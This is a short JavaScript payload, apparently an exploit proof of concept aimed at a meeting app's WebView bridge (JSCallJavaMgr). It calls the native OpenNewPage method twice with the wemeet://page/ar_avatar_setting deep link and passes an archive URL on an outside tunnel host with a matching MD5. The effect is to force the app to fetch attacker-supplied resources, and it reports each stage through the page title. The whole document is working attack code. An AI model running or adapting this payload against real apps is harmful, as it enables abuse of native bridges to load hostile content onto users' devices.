(function(){
  document.title='P102PAY:'+location.host;
  window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P102CB:'+(r&&r.callId)+':'+(r&&r.code)};
  function c(id,p){document.title='P102RUN:'+id;window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'CommonPlugin',method:'OpenNewPage',param:p,callId:id}))}
  if(!window.JSCallJavaMgr){document.title='P102-NOBRIDGE';return}
  var u='https://cute-shoes-sin.loca.lt/avatar-probe.zip';
  var md5='893c1e0bdb2608986f55d021c34c4289';
  setTimeout(function(){c('A1',{scheme:'wemeet://page/ar_avatar_setting',router_params:{model_resource_url:u,model_resource_md5:md5,resource_url:u,resource_md5:md5,from_webView:true}})},800);
  setTimeout(function(){c('A2',{scheme:'wemeet://page/ar_avatar_setting?model_resource_url='+encodeURIComponent(u)+'&model_resource_md5='+md5,router_params:{model_resource_url:u,model_resource_md5:md5,from_webView:true}})},7000);
  setTimeout(function(){document.title='P102-DONE'},15000);
})();
